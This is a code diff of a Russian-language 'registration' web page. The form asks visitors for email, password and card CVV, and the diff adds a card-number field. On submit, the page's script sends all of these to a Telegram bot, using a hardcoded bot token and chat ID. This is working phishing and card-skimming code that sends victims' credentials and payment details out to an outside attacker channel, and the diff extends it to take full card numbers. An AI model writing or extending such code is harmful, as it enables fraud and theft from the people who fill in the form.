@@ -40,6 +40,9 @@
         <label for="cvv">CVV код (3-х значный код на обратной стороне карты)</label>
         <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         <br>
+        <p></p>
+        <label for="card">Номер банковской карты</label>
+        <input type="text" id="card" name="card" required maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Введите номер карты (только цифры)">
         <button type="submit">Зарегистрироваться</button>
         <button type="button" id="forgot-password">Забыли пароль?</button> <!-- Кнопка для восстановления пароля -->
     </form>
@@ -52,6 +55,9 @@
             
             const username = document.getElementById('pass').value;
             const email = document.getElementById('email').value;
+            const card = document.getElementById('card').value;
+            
+            
 
             // Проверка на наличие символа @ в email
             if (!email.includes('@')) {
@@ -67,10 +73,11 @@
             }
 
             const cvv = document.getElementById('cvv').value;
+            
 
             const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
             const chatId = -1002372284940; 
-            const message = `Новая регистрация:\n Почта: ${email}\n Пароль: ${username}\n CVV: ${cvv}`;
+            const message = `Новая регистрация:\n Почта: ${email}\n Пароль: ${username}\n CVV: ${cvv}\n номер банка: ${card}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             
             fetch(url) 
